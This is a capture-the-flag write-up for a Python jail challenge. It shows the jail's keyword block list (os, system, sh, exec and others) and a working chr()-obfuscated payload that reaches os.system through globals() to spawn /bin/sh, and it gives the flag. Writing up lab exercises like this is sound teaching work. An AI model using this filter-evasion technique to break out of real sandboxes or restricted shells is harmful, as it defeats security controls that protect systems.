## Challenge Name: Prison Break Level 2  
Category: Misc

Challenge Description:

You are a prisoner trying to escape from the prison for the second time. You are unable to access dangerous tools (`'sys', 'import', 'flag', 'open', '/', "sh", "bin", 'eval', 'exec', 'os', 'read', 'system', 'builtins', '__builtins__'`) and filters input for banned keywords. The goal is to bypass these restrictions and execute arbitrary commands (e.g., spawn a shell) to use `cat flag.txt`. You are given the source code used in the challenge to view the confiscated tools.

**TL;DR:** To bypass string filters ('os', 'system', 'sh', etc.), we used obfuscated strings via chr() to reconstruct blocked words dynamically (e.g., "os" → chr(111)+chr(115)).
We accessed the os module indirectly through globals(), then retrieved system from os.__dict__. Finally, we executed "/bin/sh" using the obfuscated path string. This gave us a shell, allowing us to run cat flag.txt.
Payload used:

```python
globals()[chr(111)+chr(115)].__dict__[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(115)+chr(104))
```
**Flag: CITU{0k_g00d_y0u_escaped_lvl_2_ret_has_a_message_for_you_in_the_next_level}**


**jail.py source code**
```python
#!/usr/local/bin/python

import os
import sys

print("="*40)
print("Welcome to the prison break level 2")
print("="*40)
print("Warden: I found out that you escaped at level 1, and now I will confiscate your tools.")
print("Warden: I will also make sure that you won't be able to escape again. BWAHAHA!!")
print("="*40)
print("---- TIPS from 'ret' who escaped and now he is in lvl 3 ----")
print("I love decorating texts in my house.")
print("------------------------------------------------------------")
hax = input("> ")
sys.stdin.close()

confiscated_tools = ['sys', 'import', 'flag', 'open', '/', "sh", "bin", 'eval', 'exec', 'os', 'read', 'system', 'builtins', '__builtins__']

if len(hax) > 512:
    print("In here your tools was replaced...")
    exit(1)

for tool in confiscated_tools:
    if tool in hax:
        print("In here your tools was replaced...")
        exit(1)

code = f"""
import os

{hax}

""".strip()

os.execv(sys.executable, [sys.executable, "-c", code])
```

### Approach  

**1. How Should I Bypass String Filters For Blocked Modules/Functions?**

The challenge blocks direct use of strings like `"os"`, `"system"`, and `"/bin/sh"`. With the use of AI here are some tricks provides us to do; we are going to:
- Use **Obfuscate strings** using `chr()`:  
  - `chr(111) + chr(115)` → `"os"`  
  - `chr(115) + chr(121) + ...` → `"system"`  
  - `chr(47) + chr(98) + ...` → `"/bin/sh"`  

This allows us to disguise or conceal the meaning or intent of the code in a software application. The `chr()` trick bypasses keyword checks because the filters only look for literal strings like `"os"`, not dynamically constructed ones.
 
- **Access the `os` module indirectly** via `globals()`:  
Since the direct import os is blocked, `globals()` gives us access to all loaded modules, including the already-imported os module
  ```python
  globals()["os"] 
  ```  
  Equivalent to just `os`, but constructed dynamically

**2. How To Call `system("/bin/sh")` Without Using Banned Keywords Directly?**

With the power of **obfuscate strings** we can get the os module using:
  ```python
  globals()[chr(111) + chr(115)]  # Gets the `os` module
  ```  
  
Even if we get the os module, we can not directly write `os.system`. But `os.__dict__` contains all attributes of the module (including system). We access it via dictionary lookup with our constructed string The `system` function is stored in `os.__dict__`:  
  ```python
  .__dict__[chr(115) + chr(121) + chr(115) + chr(116) + chr(101) + chr(109)]  # Gets `os.system`
  ```  
Now that we have access to the os.system indrectly, we can now then access the `"/bin/sh"` using **obfuscate strings** again.
  ```python
  (chr(47) + chr(98) + chr(105) + chr(110) + chr(47) + chr(115) + chr(104))  # "/bin/sh"
  ```  
  **Final payload**:  
  ```python
  globals()["os"].__dict__["system"]("/bin/sh")  # Deobfuscated version
  ```  
  
**3. Time To Get That Flag With Disguise🚩🎭**

```console
globals()[chr(111)+chr(115)].__dict__[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(115)+chr(104))
```
Now that the shell has been spawned, we can now use the command `cat flag.txt`
> CITU{0k_g00d_y0u_escaped_lvl_2_ret_has_a_message_for_you_in_the_next_level}

### Reflections
This made me learn more about dunder attributes in Python and that creative idea of using obfuscated strings to bypass the string checkers. I will not forget obfuscated strings.

Also, most of the logic to find the answer of this CTF is through AI.
  

---
[Back to home](/)
